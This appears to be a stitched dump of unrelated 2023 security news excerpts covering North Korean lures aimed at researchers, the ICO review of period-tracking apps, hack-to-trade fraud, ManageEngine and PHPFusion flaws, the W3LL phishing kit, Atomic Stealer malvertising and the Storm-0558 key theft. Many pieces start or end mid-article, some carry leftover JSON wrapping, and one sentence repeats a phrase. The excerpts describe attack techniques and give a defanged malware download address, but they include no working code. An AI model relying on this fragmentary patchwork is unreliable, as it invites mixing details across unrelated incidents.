The team has discovered the exploitation of at least one zero-day vulnerability in the last few weeks, prompting TAG to promptly report the issue to the affected vendor, who is now working on a patch.Notably, Google has yet to disclose details on the zero-day flaw exploited in these attacks and the name of the vulnerable software, likely because the vendor is still patching the vulnerability.The modus operandi of these threat actors involves establishing communication with security researchers via social media platforms such as X (formerly Twitter) before migrating to encrypted messaging apps like Signal, WhatsApp or Wire. Once trust is established, the attackers distribute malicious files containing zero-day vulnerabilities within widely used software packages.Notably, in addition to zero-day exploitation, the threat actors have developed a standalone Windows tool designed to download debugging symbols from major symbol servers, including those of Microsoft, Google, Mozilla and Citrix. While seemingly legitimate, this tool can also execute arbitrary code from attacker-controlled domains, potentially compromising victims’ systems.To safeguard against these threats, TAG has advised those who may have downloaded or run the tool to take precautions, including a possible system reinstall."

It also wants users to come forward and share their experiences.The regulator claimed that over half of women responding to a recent poll said that transparency over how their data is used (59%) and data security (57%) are bigger concerns when choosing an app than cost (55%) and ease of use (55%).Additionally, over half of those who use the apps claimed they had noticed an increase in baby or fertility-related adverts since signing up. Although some viewed these ads positively, 17% described them as “distressing,” according to the ICO.Applications designed to help women manage their menstrual cycles and plan or prevent pregnancy are increasingly popular: the ICO claimed a third of British women have used them.Among the potential harms the regulator will investigate are complicated and confusing privacy policies, apps requesting or storing excessive volumes of personal data, and users receiving upsetting targeted ads they didn’t sign up to.ICO deputy commissioner of regulatory policy, Emily Keaney, said the watchdog wants to ensure women can use tracking apps with confidence – adding that feedback from users will help it better understand which areas need improvement, as well as the benefits they offer to women.“This review is intended to establish both the good and bad of how the apps are working currently. Once we have more information, we will explore next steps, but we will not hesitate to take regulatory action to protect the public if necessary.”“To maintain trust in these products companies must be transparent about the data they collect and how they use it, and ensure that the data is not used or shared in ways that people would not expect,” argued executive director for regulatory risk, Stephen Almond.“The ICO is developing guidance on data protection and Internet of Things devices and we will act where we don’t see the rules being followed.”"

To conceal the origins of the attacks, Klyushin used proxy computer networks outside of Russia.This gave him access to non-public information, such as quarterly and annual earnings reports of hundreds of companies that had not yet been filed with the SEC. Klyushin used this information to make trading decisions – knowing ahead of time whether a company’s share price would likely rise or fall following its public earnings announcement.Many of the illegally obtained earnings reports were downloaded through a computer server located in downtown Boston.In total, Klyushin netted around $93m from roughly $9m investment in earnings trading between January 2018 and September 2020.It is alleged that he conspired with four other Russians to commit the offenses – Ivan Ermakov, Nikolai Rumiantcev, Mikhail Vladimirovich Irzak and Igor Sergeevich – all of whom remain at large.Klyushin, along with alleged co-conspirators Ermakov and Rumiantcev, worked at M-13, a cybersecurity company offering penetration testing and Advanced Persistent Threat (APT) emulation services. The same techniques advertised by M-13 to customers were utilized in the attacks the attacks.M-13’s website also indicated that its “IT solutions” were used by numerous Russian government agencies.Acting United States Attorney Joshua S. Levy commented: “[Klyushin] thought he could get away with his crimes by perpetrating them from a foreign base, hidden behind layers of fake domain names, virtual private networks, and computer servers rented under pseudonyms and paid for with cryptocurrency. He found out otherwise, and will now spend nearly a decade of his life in a US prison.”Levy said the case should send a message to criminals around that world that their location does not provide anonymity and the reach of American law enforcement is long.“Anyone who defrauds American companies, markets or investors, will be found and prosecuted, regardless of where they hide, or how long it takes,” he added.Klyushin was arrested in Switzerland in March 2021 and extradited to the US in December 2021."

The root cause of the problem is that ManageEngine products use an outdated third-party dependency, Apache Santuario.The researchers tested their PoC exploit against Endpoint Central, however, they believe it can work on many of the ManageEngine products that share some of their codebase with ServiceDesk Plus or EndpointCentral.In the attack detailed in the CISA alert, as early as January 2023, APT actors exploited the vulnerability CVE-2022-47966 for initial access to the target organization. The attackers gained access to a web server hosting the public-facing application, Zoho ManageEngine ServiceDesk Plus. Threat actors achieved root level access on the web server and created a local user account named ‘Azure’ with administrative privileges.Then the nation-state actors downloaded malware, enumerated the network, collected administrative user credentials, and performed lateral movement. It is unclear if the attackers gained access to proprietary information or altered it. The attackers have initiated multiple Transport Layer Security (TLS)-encrypted sessions to multiple IP addresses, indicating successful exchanges of data transfer from the firewall device.Nation-state actors disabled administrative account credentials to delete logs from several critical servers in the targeted network.The attackers used a Meterpreter as an interactive shell that allowed them remotely control the system.Between early-February and mid-March 2023, the government experts observed the presence of anydesk.exe on three hosts.

They threatened to pull their services from the UK if the bill went ahead in its current form, arguing it would be impossible to deliver a system which would not be exposed to future government overreach or “any adversary who compromises the monitoring infrastructure.”They also argued that the scanning and matching technology itself is far from accurate, raising the prospect of dangerous false positives.The government appears to have conceded this. Junior arts and heritage minister Stephen Parkinson told the House of Lords yesterday that Ofcom would not use its powers until it’s “technically feasible” to do so – which could take years.The government statement was welcomed by Signal president, Meredith Whittaker.“Is it everything we want or need?

In fact, it has grown more frequent and sophisticated over the years,\" says Callie Guenther, cyber threat research senior manager at Critical Start. \"These operations are multifaceted, aiming not just to steal information but also to gain insights into defense mechanisms, refine their tactics, and better evade future detection.\"Researchers from Google first caught wind of this strange hacker outfit more than two years ago, when it began to pepper the inboxes of security professionals on social media. The accounts in question were given largely generic-sounding American names like \"James Willy\" and \"Billy Brown,\" and the social engineers even created real cybersecurity research content in order to lend legitimacy to their fake personas.Conversations then typically moved to an encrypted messaging app like Signal or WhatsApp. Once sufficient trust was established, the threat actor would finally forward a file containing a zero-day vulnerability in a popular software package. (Google is withholding further details about either, until the vendor has had time to patch.)If the victim fell for the bait and executed the file, the downloaded shellcode would first check if it's running on a virtual machine — in which case, it would be ineffectual — before sending information about the compromised device, including a screenshot, to attacker-controlled command-and-control (C2) infrastructure.Besides this more involved path, the attackers appear to have concocted one more lax method to ensnare the average researcher passerby.getsymbol actually does what it says it does. However, it also enables the developers to run arbitrary code on the machine of any researcher who downloaded it.

Security researchers are on the forefront of discovering vulnerabilities and developing mitigation techniques.

      "text": " Deputy Editor, Infosecurity MagazineSensitive patient data may have been accessed following a breach of the Janssen CarePath platform, a subsidiary of pharmaceutical giant Johnson & Johnson.Tech firm IBM, a service provider to Johnson & Johnson Health Care Systems, notified customers of the incident in a statement on September 6, 2023.IBM explained it was alerted to a “technical issue” by which unauthorized access to the third-party database that supports Janssen could be obtained.Upon investigation, it discovered that there was unauthorized access to personal information in the database on August 2. This may have included customers’ names, contact information, date of birth as well as sensitive medical data, such as health insurance details and information on medications and associated conditions that were provided to the Janssen CarePath application.However, social security numbers and financial account information were not contained in the database or affected.The breach could affect in excess of a million individuals, with Janssen reporting that 1.16 million patients use its CarePath program in 2022.IBM has worked with the database provider to address the technical issue, but warned Janssen customers about the potential for their personal information to be misused by malicious actors.Although IBM has not been able to confirm the extent of access to patient data, it has advised Janssen CarePath users to regularly review account statements and explanations of benefits from their health insurer or care providers with respect to any unauthorized activity, and to promptly report any suspicious activity.In addition, individuals whose information was potentially affected have been offered a complimentary one-year credit monitoring service.Commenting on the story, William Wright, CEO of Closed Door Security, noted that IBM’s description of how the database was accessed as a “technical method” suggests it could been via an unpatched vulnerability or a failure to properly secure the database against external access.“These are two concerning security issues, but they plague organizations every day because of a failure to carry out regular and effective security testing,” said Wright.He added that the sensitive nature of the data exposed in the incident could be a “gold mine” for malicious actors.“Healthcare data is the most valuable information on the dark web, so attackers have multiple ways to monetise from it – either by selling it on or exploiting victims further. IBM must communicate with those impacted as a matter of urgency, because they need to be on guard for further attacks,” he stated."

      "text": " The campaign abuses Advanced Installer, a tool for creating software packages, to hide malware in legitimate installers for software used by creative professionals — such as Adobe Illustrator, Autodesk 3ds Max, and SketchUp Pro, according to a report by Cisco Talos' Threat Researcher Chetan Raghuprasad published this week.Most of the campaign's software installers were written in French, which makes sense as most of the victims are in France and Switzerland, according to the post. However, the campaign also targeted victims in the US, Canada, Algeria, Sweden, Germany, Tunisia, Madagascar, Singapore, and Vietnam.Organizations affected are those that typically employ professionals working in 3D modeling and graphic design, including verticals such as architecture, engineering, construction, manufacturing, and entertainment.Attackers likely targeted these sectors because they use computers with high GPU specifications and powerful graphics cards, which are useful for generating cryptocurrency, Raghuprasad wrote.Cisco Talos could not determine the initial attack method for how the weaponized software installers were delivered to infected machines. \"In the past, we have commonly seen such trojanized installers delivered using the search engine optimization (SEO) poisoning,\" Raghuprasad acknowledged.The first attack sequence starts when a victim clicks on a legitimate software installer, which the attacker bundled with a malicious script using Advanced Installer. The attack abuses Advanced Installer's Custom Action feature to execute the dropped malicious batch file, which contains a command to configure the task scheduler in the victim's machine.The attack vector also drops a malicious PowerShell loader script and an encrypted file, the M3_Mini_RAT client stub. The task created by the original batch file runs every minute to execute the malicious PowerShell loader script, which generates the M3_Mini_Rat client stub and runs it in the victim's machine memory.M3_Mini_Rat then attempts to connect to the attackers' command-and-control (C2); however, the C2 was unresponsive in the attack that researchers observed, so they did not see any cryptomining payloads dropped.The second attack method also abuses Advanced Installer and its Custom Actions feature to drop malicious batch scripts, proceeding with an attack that deviates slightly from the first attack but ultimately downloads PowerShell loaders for executing malicious payloads. The researchers managed to observe the launch of the PhoenixMiner and lolMiner from PowerShell in this attack vector.\"This poses challenges for the defense systems to classify [the attack] unless they consider other observables of the attack chain,\" Raghuprasad says.Attackers also have increased their likelihood of financial gain through the use of lolMiner, which gives them the option to mine several cryptocurrencies at the same time, he says.Further, the employment of the M3_Mini_RAT, which has remote administration capabilities that mainly focus on performing system reconnaissance, provides valuable insight into the victim's environment and could portend future attacks.\"Its capability of downloading and executing other binary increases the likelihood of follow-on payloads, [such as] other malicious executables or arbitrary commands,\" Raghuprasad says.The Advanced Installer campaign showed attackers pivoting from their typical targets — namely, gamers — as well as a novel use of legitimate installers to achieve their ultimate goal, he says.\"Organizations and users should be aware that threat actors are constantly looking for new avenues to compromise the victims and exploit them,\" he says. \"This is why you want a defense-in-depth approach and need to run things like endpoint security to try and avoid these types of malicious installers.\"In fact, users should be vigilant in general while downloading the software installers, making a point to download them only from a legitimate and trusted source, Raghuprasad says.It's also important that organizations use legitimate copies of applications and not just conduct Web searches for them and download the top result, which could be a malicious ad, he adds.Copyright © 2023 Informa PLC Informa UK Limited is a company registered in England and Wales with company number 1072954 whose registered office is 5 Howick Place, London, SW1P 1WG."

      "text": " Freelance JournalistA Reddit user known as “Educational-Map-8145” has exposed a critical zero-day flaw affecting the Linux client of Atlas VPN, a popular virtual private network service. The vulnerability, which impacts the latest version of the client (1.0.3), allows malicious websites to disconnect the VPN and reveal the user’s IP address, raising concerns about user privacy and security.According to the Reddit post published last week, the vulnerability stems from an API endpoint within the Atlas VPN Linux Client that listens on localhost (127.0.0.1) through port 8076. This API provides a command-line interface for various functions, including disconnecting a VPN session via a specific URL. Notably, this API lacks any form of authentication, making it susceptible to abuse by any program running on the user’s computer, including web browsers.“Security solutions that are in line trust the incoming and outgoing traffic. Endpoint VPN clients are [...] on all devices today, increasing the attack surface. This positioning makes VPNs an attractive target for both external and internal threat actors.”As security experts warn of the risk, Atlas VPN users are advised to exercise caution when browsing the web until a patch or solution is provided to address this critical vulnerability.“In this scenario, the attack uses a simple command instead, which slips through the CORS gauntlet – and in this case, turns off the VPN, immediately exposing the user’s IP and therefore general location.”Despite the potential security risk, attempts to contact Atlas VPN’s support for responsible disclosure or information on a bug bounty program by Educational-Map-8145 have reportedly gone unanswered.However, the company replied to Infosecurity's request for comment by saying they are aware of the vulnerability and have confirmed its authenticity.\"We’re actively working on fixing the vulnerability as soon as possible. Once the vulnerability is eliminated, users will receive a prompt to update the Linux app to the latest version. In the meantime, we informed our users to withhold from using the Atlas VPN Linux app until the vulnerability is fixed,\" Atlas VPN told Infosecurity in an email.\n\nThe company also said that it does not currently have a bug bounty program in place. Nevertheless, should anyone discover any potential threats or vulnerabilities associated with their service, they are encouraged to contact the company via security@atlasvpn.com.\n\nUPDATE: This article was updated on 08/09/2023 to include Atlas VPN's comment.Editorial image credit: Ralf Liebhold / Shutterstock.com"

      "text": " The Atomic Stealer first appeared in the threat landscape in April 2023. In April Cyble Research and Intelligence Labs (CRIL) discovered a Telegram channel advertising a new information-stealing malware, named Atomic macOS Stealer (AMOS). The malware targets macOS, it was designed to steal sensitive information from the infected systems.The researchers reported that the Atomic Stealer is constantly improved by its authors.The Atomic macOS Stealer allows operators to can steal various types of information from the infected machines, including Keychain passwords, complete system information, files from the desktop and documents folder, and even the macOS password.The malware is able to steal data from multiple browsers, including auto-fills, passwords, cookies, wallets, and credit card information. AMOS can target multiple cryptowallets such as Electrum, Binance, Exodus, Atomic, and Coinomi.The development team behind the threat released a new version at the end of June.Malwarebytes reported that threat actors have been distributing the info-stealer mostly via cracked software downloads or impersonating legitimate websites and using ads on search engines such as Google to trick victims into downloading it. The malvertising campaign observed by Malwarebytes mainly relies on Google Ads as a distribution vector. Users searching for popular software, legitimate or cracked, were served rogue ads that point to websites hosting malicious installers.The threat actors used a fraudulent website for TradingView, featuring three buttons to download the software for Windows, macOS, and Linux operating systems.The Mac button points to the installer hosted at: https://app-downloads[.]org/tview.phpThe downloaded file (TradingView.dmg) includes the instructions to open it bypassing the security mechanism GateKeeper. “TradingView.dmg” is a version of Atomic Stealer that was released in June. The malware is bundled in an ad-hoc signed app that, once executed, it will prompt for the user password in a never-ending loop until victims finally provide it.The attackers use this trick to execute the malware and steal data from victims, then they immediately exfiltrate it back to their server.“Malvertising continues to be an effective vector to target new victims by abusing the trust they have in their search engines. Malicious ads coupled with professional-looking phishing pages make for a potent combo that can trick just about anyone.” concludes the report. While Mac malware really does exist, it tends to be less detected than its Windows counterpart. The developer or seller for AMOS actually made it a selling point that their toolkit is capable of evading detection.”\nCopyright@securityaffairs 2023 "

However, as the storage was filled to capacity before the completion of the tasks, an error occurred, causing the system to shut down.This shutdown directly impacted the company's production ordering system so that no production tasks could be planned and executed.Toyota explains that its main servers and backup machines operate on the same system. Due to this, both systems faced the same failure, making a switchover impossible, inevitably leading to a halt in factory operations.The restoration came on August 29th, 2023, when Toyota's IT team had prepared a larger capacity server to accept the data that was partially transferred two days back.This allowed Toyota's engineers to restore the production ordering system and the plants to resume operations.This incident underscores the intricate nature of IT challenges and the consequences they can have when routine maintenance tasks are not properly planned.A seemingly minor oversight, like miscalculating necessary disk space for data migration or simply running out of storage space, can result in multimillion-dollar losses for major organizations.Toyota has had a rough year so far in terms of IT system security and data management."

Hence, BLE-enabled devices in range will perceive these broadcasts as legitimate connection requests.This can be used to confuse a target by sending them bogus requests, making it difficult to discern legitimate devices among a large number of fakes or mimic trusted devices to perform phishing attacks.Techryptic focuses on the pranking aspect of the attack, claiming that if a large volume of requests is generated, the target device will display numerous non-stop notifications, which can severely disrupt the user experience.\"It underscores the importance of being aware of the devices around us and the potential vulnerabilities inherent in wireless communications.\"The researcher says that to perform the attack, the Flipper Zero firmware needs to be updated to enable Bluetooth functionality, and the 'gap.c' file has to include the code that will generate the fake notification.Techryptic has created and shared code for generating the following notifications:Flipper Zero users who want to experiment with this attack may copy the code generated on Techryptic's site for each notification choice to the 'gap.c' and patch their firmware, so minor tweaking is required.BleepingComputer has contacted Apple with a request for a comment on the above, but we have not heard back by publication time."

      "text": " A threat actor known as W3LL developed a phishing kit that can bypass multi-factor authentication along with other tools that compromised more than 8,000 Microsoft 365 corporate accounts.In ten months, security researchers discovered that W3LL’s utilities and infrastructure were used to set up about 850 phishing that targeted credentials for more than 56,000 Microsoft 365 accounts.Serving a community of at least 500 cybercriminals, W3LL’s custom phishing tools were employed in business email compromise (BEC) attacks that caused millions of U.S. dollars in financial losses.Researchers say that W3LL’s inventory covers almost the entire kill chain of a BEC operation and can be operated by “cybercriminals of all technical skill levels.”In a report today, cybersecurity company Group-IB provides details about W3LL and how it grew to be one of the most advanced malicious developers for BEC groups.The first evidence of W3LL’s activity appears to be from 2017 when the developer started to offer a custom tool for bulk email sending called W3LL SMTP Sender, which was used for spamming.The actor’s popularity and business started to grow when it started to sell a custom phishing kit focused on Microsoft 365 corporate accounts.In 2018, W3LL launched its W3LL Store, an English-speaking marketplace where it could promote and sell its tools to a closed community of cybercriminals, the researchers say.Apart from W3LL Panel, which was designed to bypass multi-factor authentication (MFA), the actor provides 16 more tools, all primed for BEC attacks. The catalog includes:According to Group-IB, W3LL Store offers solutions for deploying a BEC attack from the initial stage of picking victims, phishing lures with weaponized attachments (default or customized), to launching phishing emails that land in the victims’ inboxes.The researchers say that W3LL is sufficiently skilled to protect its tools from being detected or taken down by deploying and hosting them on compromised web servers and services.However, customers also have the option to use W3LL’s OKELO scanner to find vulnerable systems and gain access to them on their own.Some of the techniques W3LL employs to bypass email filters and security agents include various obfuscation methods for email headers and text body (Punycode, HTML tags, images, links with remote content).Initial phishing links are also delivered using multiple methods that evade detection. One is through phishing attachments instead of embedding them in the email body.The link is placed in an HTML file that comes as an attachment, the researchers discovered. When the victim launches the malicious HTML, which could be disguised as a document or voice message, a browser window opens up with a “genuine-looking MS Outlook animation.”This is the W3LL Panel phishing page ready to collect Microsoft 365 account credentials.Analyzing a W3LL phishing attachment discovered in the wild, Group-IB noticed that it was an HTML file that displayed a website in an iframe by using JavaScript obfuscated through base64 encoding.In a newer version, updated in late June, W3LL added multiple layers of obfuscation and encoding. It loads the script directly from the W3LL Panel instead of including it in the HTML code.The chain of events for the more recent variant looks like this:For W3LL to compromise a Microsoft 365 account, it uses the adversary/man-in-the-middle (AitM/MitM) technique, where communication between the victim and the Microsoft server passes through the W3LL Panel and the W3LL Store acting as a backend system.The goal is to obtain the victim’s authentication session cookie. For this to happen, W3LL Panel needs to go through several steps, which include:After the W3LL Panel gets the authentication session cookie, the account is compromised and the victim is shown a PDF document, to make the login request appear legitimate.Using CONTOOL, the attacker can automate the finding of emails, phone numbers, attachments, documents, or URLs the victim used, which could help with the lateral movement stage.The tool can also monitor, filter, and modify incoming emails, as well as receive in a Telegram account notifications based on specific keywords.According to Group-IB, the typical results from such an attack are:W3LL Panel is the crown jewel of the developer and it comes at $500 for three months, and a $150 monthly renewal price. A license to activate it must also be bought.Bellow is the purchase page for the kit and the administration panel:The W3LL threat actor has been around for about five years and amassed a customer base of more than 500 cybercriminals that have in the store over 12,000 items to choose from.Apart from phishing and BEC-related tools, W3LL also provides access to compromised web services (web shell, email, content management systems) and SSH and RDP servers, hosting and cloud service accounts, business email domains, VPN accounts, and hijacked email accounts. Group-IB researchers say that between October 2022 and July 2023, W3LL sold more than 3,800 items, for an estimated turnover that exceeds $500,000."

      "text": " Security researchers have discovered what they described as a critical vulnerability in the relatively widely used PHPFusion open source content management system (CMS).The vulnerabilities exist in versions 9.10.30 of PHPFusion and earlier. No patch is currently available for either flaw.Synopsys said it attempted to contact administrators at PHPFusion multiple times, first via email, then through a vulnerability disclosure process, then GitHub, and finally via a community forum, before disclosing it this week. PHPFusion did not respond to a request for comment from Dark Reading.According to Synopsis, CVE-2023-2453 stems from improper sanitization of certain types of files with tainted filenames. The issue gives attackers a potential way to upload and execute an arbitrary .php file on a vulnerable PHPFusion server.\"Exploitation of this vulnerability has effectively two requirements,\" says Matthew Hogg, software engineer at Synopsys' Software Integrity Group, who discovered the vulnerability. One of them is that the attacker needs to be able to authenticate to at least a low-privileged account, and the other is that they need to know the vulnerable endpoint. \"By fulfilling both criteria, a malicious actor would be able to craft a payload to exploit this vulnerability,\" Hogg says.Ben Ronallo, vulnerability management engineer at Synopsys, says it's important to note that an attacker would need to find some way to upload a maliciously crafted .php payload to any location on a vulnerable system. \"The attacker would need to review the source code of PHPFusion to identify the vulnerable endpoint,\" Ronallo says.What an attacker can do after exploiting the vulnerability depends on the privileges associated with the PHPFusion user's account. An attacker with access to administrator credentials, for instance, can read arbitrary files on the underlying operating system. \"In the worst case, an attacker could achieve remote code execution (RCE), provided they have some means to upload a payload file to target for inclusion,\" he says. \"Both cases could result in the theft of sensitive information, and the latter may allow control over the vulnerable server.\"Meanwhile, the less severe bug that Synopsys discovered in PHPFusion (CVE-2023-4480) is tied to an out-of-date dependency in a Fusion file manager component that is accessible via the CMS's admin panel. An attacker with the privileges of an administrator or super administrator can exploit the vulnerability to either disclose the contents of files on a vulnerable system or write certain types of files to known paths on the server's file system, Synopsys said.Copyright © 2023 Informa PLC Informa UK Limited is a company registered in England and Wales with company number 1072954 whose registered office is 5 Howick Place, London, SW1P 1WG."

In a response via Reddit, the head of the IT department at AtlusVPN wrote that the company is fixing the issue, will notify all Linux client users, and release a patch \"as soon as possible.\"In a written statement for Dark Reading, AtlusVPN could not provide an exact timeline for its patch but assured that \"we are actively working on fixing the vulnerability as soon as possible.\"Copyright © 2023 Informa PLC Informa UK Limited is a company registered in England and Wales with company number 1072954 whose registered office is 5 Howick Place, London, SW1P 1WG."

      "text": " Microsoft says Storm-0558 Chinese hackers stole a signing key used to breach government email accounts from a Windows crash dump after compromising a Microsoft engineer's corporate account.The attackers used the stolen MSA key to breach the Exchange Online and Azure Active Directory (AD) accounts of roughly two dozen organizations, including government agencies in the United States, such as the U.S. State and Commerce Departments.They exploited a now-patched zero-day validation issue in the GetAccessTokenForResourceAPI, which enabled them to forge signed access tokens and impersonate accounts within the targeted orgs.While investigating Storm-0558's attack, Microsoft found that the MSA key was leaked into a crash dump after a consumer signing system crashed in April 2021.Even though the crash dump shouldn't have included signing keys, a race condition led to the key being added. This crash dump was later moved from the company's isolated production network to its internet-connected corporate debugging environment.The threat actors found the key after successfully compromising a Microsoft engineer's corporate account, which had access to the debugging environment containing the key erroneously included in the April 2021 crash dump.\"Our credential scanning methods did not detect its presence (this issue has been corrected).\"As Tamari said, the key could be used to impersonate any account within any impacted customer or cloud-based Microsoft application.\"This includes managed Microsoft applications, such as Outlook, SharePoint, OneDrive, and Teams, as well as customers' applications that support Microsoft Account authentication, including those who allow the 'Login with Microsoft' functionality,\" Tamari said.\"Everything in the world of Microsoft leverages Azure Active Directory auth tokens for access,\" Wiz CTO and Cofounder Ami Luttwak also told BleepingComputer.\"An attacker with an AAD signing key is the most powerful attacker you can imagine, because they can access almost any app – as any user. This is the ultimate cyber intelligence' shape shifter' superpower.\"\"The old public key's certificate revealed it was issued on April 5th, 2016, and expired on April 4th, 2021,\" Tamari added.Redmond later told BleepingComputer that the compromised key could only be used to target apps that accepted personal accounts and had the validation error exploited by the Chinese hackers.In response to the security breach, Microsoft revoked all valid MSA signing keys to prevent threat actors from accessing other compromised keys. This step also effectively blocked any additional efforts to generate new access tokens. Additionally, Microsoft relocated the recently generated access tokens to the key store used by its enterprise systems.After revoking the stolen signing key, Microsoft found no additional evidence of unauthorized access to customer accounts employing the same auth token forging technique.Before this, such logging capabilities were only available to customers with Purview Audit (Premium) logging licenses. As a result, Redmond faced substantial criticism for impeding organizations from promptly detecting Storm-0558's attacks."
